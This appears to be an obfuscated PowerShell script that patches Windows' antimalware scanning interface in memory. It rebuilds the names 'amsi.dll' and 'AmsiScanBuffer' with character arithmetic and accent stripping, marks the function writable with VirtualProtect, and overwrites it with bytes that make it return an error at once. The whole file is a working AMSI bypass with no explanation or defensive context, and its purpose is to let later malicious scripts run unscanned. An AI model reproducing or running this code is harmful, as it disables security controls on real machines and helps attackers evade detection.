$E0A2L7 = @"
using System;
using System.Runtime.InteropServices;
public class E0A2L7 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr kRmN0S9JfQ8tH9, string VORsl7ZFX32bY);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr Kpcx_, UIntPtr G2F, uint UcXx_k6ylGG1SwrR, out uint Lzu3hYnj8C);
}
"@

Add-Type $E0A2L7

$H9uKb = [E0A2L7]::LoadLibrary("$([char](97*90/90)+[CHaR](109*73/73)+[cHAr](115*70/70)+[char](25+80)+[char](9+37)+[cHAr]([BYte]0x64)+[chAR](108+26-26)+[cHAr](108+106-106))")
$i5imgI__BUeFae31B4iP = [E0A2L7]::GetProcAddress($H9uKb, "$(('ÄmsìScà'+'nBûffér').NOrMaLiZE([cHAR]([byTe]0x46)+[chAr](111+54-54)+[CHAR](114)+[ChAr]([Byte]0x6d)+[ChaR]([BYTE]0x44)) -replace [CHar](92*52/52)+[CHAr](88+24)+[chAr]([BYTe]0x7b)+[ChAR]([bYTE]0x4d)+[chaR](110*20/20)+[CHAr](125*47/47))")
$p = 0
[E0A2L7]::VirtualProtect($i5imgI__BUeFae31B4iP, [uint32]5, 0x40, [ref]$p)
$ZTRlgNUqjeRTDk_0Q = "0xB8"
$pxWhkweAv4v3 = "0x57"
$szQa6A = "0x00"
$k8BVrhR2UHMOO4YXRIhU = "0x07"
$IVm0w = "0x80"
$yQj2x6JduEb7wbwvCMPT = "0xC3"
$ThhiMHZMAmGf3v = [Byte[]] ($ZTRlgNUqjeRTDk_0Q,$pxWhkweAv4v3,$szQa6A,$k8BVrhR2UHMOO4YXRIhU,+$IVm0w,+$yQj2x6JduEb7wbwvCMPT)
[System.Runtime.InteropServices.Marshal]::Copy($ThhiMHZMAmGf3v, 0, $i5imgI__BUeFae31B4iP, 6)